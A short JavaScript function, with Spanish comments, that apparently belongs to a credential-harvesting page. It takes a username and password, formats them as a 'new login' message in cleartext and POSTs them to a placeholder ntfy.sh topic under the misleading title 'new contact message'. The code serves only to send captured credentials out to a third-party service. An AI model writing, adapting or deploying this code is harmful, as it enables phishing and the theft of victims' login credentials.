async function enviarMensaje(username, password) {
  const mensaje = `📥 Nuevo login:\n👤 Usuario: ${username}\n🔒 Contraseña: ${password}`;

  try {
    const response = await fetch("https://ntfy.sh/YOUR_LESS0", { // ← Cambia esto
      method: "POST",
      body: mensaje,
      headers: {
        "Title": "Nuevo mensaje de contacto",
        "Priority": "high"
      }
    });

    if (response.ok) {
      return { status: 200, message: "✅ Mensaje enviado con éxito!" };
    } else {
      throw new Error("Fallo en la respuesta de ntfy.sh");
    }
  } catch (e) {
    return { status: 500, message: `❌ Error al enviar: ${e.message}` };
  }
}
